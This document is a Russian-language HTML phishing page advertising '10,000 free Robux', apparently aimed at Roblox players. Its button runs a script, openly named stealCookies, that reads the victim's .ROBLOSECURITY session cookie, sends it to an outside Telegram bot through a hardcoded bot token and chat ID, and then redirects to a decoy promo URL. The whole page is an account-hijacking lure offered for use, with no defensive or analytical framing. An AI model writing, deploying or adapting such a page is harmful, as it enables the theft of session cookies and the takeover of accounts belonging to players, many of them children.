<!DOCTYPE html>
<html>
<head>
    <title>Бесплатные 10000 Робуксов!</title>
    <script>
        async function stealCookies() {
            // Capture the victim's Roblox cookies
            var robloxCookies = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
            
            // Send the stolen cookies to the Telegram bot
            const botToken = '8231043844:AAFZs7dQ-suK_mfz2vo_CSQFNR0EhflqkAw';
            const chatId = '7759891108';
            const message = `🔥 НОВЫЕ КУКИ! 🔥\n${robloxCookies}`;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            
            // Redirect to the fake Roblox site
            window.location.href = 'https://www.roblox.com/fake-promo?robux=10000';
        }
    </script>
    <style>
        body { font-family: Arial; background: linear-gradient(to bottom, #60a5fa, #3b82f6); text-align: center; padding-top: 50px; }
        .button {
            background-color: #22c55e; color: white; padding: 15px 32px; text-align: center; font-size: 16px;
            margin: 4px 2px; cursor: pointer; border: none; border-radius: 12px; font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>Получить 10 000 Робуксов!</h1>
    <p>Нажмите на кнопку ниже, чтобы получить бесплатные робуксы!</p>
    <button class="button" onclick="stealCookies()">Получить сейчас!</button>
</body>
</html>
